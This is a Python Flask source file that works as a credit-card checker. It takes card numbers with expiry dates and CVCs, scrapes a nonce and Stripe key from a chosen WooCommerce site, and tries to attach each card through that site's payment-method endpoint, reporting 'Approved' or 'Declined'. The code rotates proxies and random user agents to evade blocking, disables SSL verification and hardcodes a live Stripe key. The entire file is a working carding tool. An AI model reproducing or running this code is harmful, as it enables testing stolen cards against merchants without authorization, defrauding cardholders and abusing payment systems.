from flask import Flask, jsonify, render_template_string, request
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import uuid
import time
import re
import random
import string
import os
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# Disable SSL warnings for verify=False
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# --- PROXY LIST ---
# Add your SOCKS5 or HTTP proxies here to bypass Render IP blocks
PROXIES = [
    # "http://user:pass@host:port",
    # "socks5://host:port"
]

def get_random_proxy():
    if not PROXIES: return None
    proxy = random.choice(PROXIES)
    return {"http": proxy, "https": proxy}

# Global ThreadPool for Concurrency
executor = ThreadPoolExecutor(max_workers=10)

@app.route('/')
def home():
    # Keeping your original beautiful glass UI
    return render_template_string("""...""") # (Insert your original HTML here)

def extract_nonce(html_content):
    """Robust extraction using BeautifulSoup & Regex"""
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # 1. Search hidden inputs
    nonce_fields = ['_ajax_nonce', 'wc-stripe-confirm-payment-nonce', 'woocommerce-register-nonce']
    for field in nonce_fields:
        tag = soup.find('input', {'name': field})
        if tag and tag.get('value'): return tag['value']
    
    # 2. Search script tags for JSON nonces
    scripts = soup.find_all('script')
    for script in scripts:
        if script.string:
            match = re.search(r'["\']nonce["\']\s*:\s*["\']([a-f0-9]{10,})["\']', script.string)
            if match: return match.group(1)
    return None

def get_stripe_key(domain, session):
    urls = [f"https://{domain}/checkout/", f"https://{domain}/?wc-ajax=get_stripe_params"]
    for url in urls:
        try:
            res = session.get(url, timeout=7, verify=False)
            match = re.search(r'pk_live_[a-zA-Z0-9_]+', res.text)
            if match: return match.group(0)
        except: continue
    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"

def process_card_enhanced(domain, ccx):
    try:
        n, mm, yy, cvc = ccx.strip().split("|")
        if "20" in yy: yy = yy.split("20")[1]
        
        session = requests.Session()
        session.proxies = get_random_proxy()
        session.headers.update({
            'User-Agent': UserAgent().random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })

        # 1. Get Nonce
        res = session.get(f"https://{domain}/my-account/add-payment-method/", timeout=10, verify=False)
        nonce = extract_nonce(res.text)
        if not nonce: return {"Response": "Nonce missing", "Status": "Declined"}

        # 2. Get Stripe Key
        stripe_key = get_stripe_key(domain, session)

        # 3. Create Payment Method (Direct to Stripe)
        pm_data = {
            'type': 'card', 'card[number]': n, 'card[cvc]': cvc,
            'card[exp_year]': yy, 'card[exp_month]': mm,
            'billing_details[address][country]': 'US', 'key': stripe_key
        }
        pm_res = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, timeout=10, verify=False)
        pm_id = pm_res.json().get('id')
        if not pm_id: return {"Response": pm_res.json().get('error', {}).get('message'), "Status": "Declined"}

        # 4. Final Addition to WooCommerce
        final_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            '_ajax_nonce': nonce
        }
        setup_res = session.post(f"https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=final_data, timeout=10, verify=False)
        
        if "succeeded" in setup_res.text:
            return {"Response": "Card Added Successfully", "Status": "Approved"}
        return {"Response": "Transaction Declined", "Status": "Declined"}

    except Exception as e:
        return {"Response": f"Error: {str(e)}", "Status": "Error"}

@app.route('/process')
def process_request():
    if request.args.get('key') != "inferno": return jsonify({"error": "Unauthorized"}), 401
    domain = request.args.get('site').replace("https://", "").replace("http://", "").split('/')[0]
    return jsonify(process_card_enhanced(domain, request.args.get('cc')))

@app.route('/health')
def health(): return jsonify({"status": "healthy"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
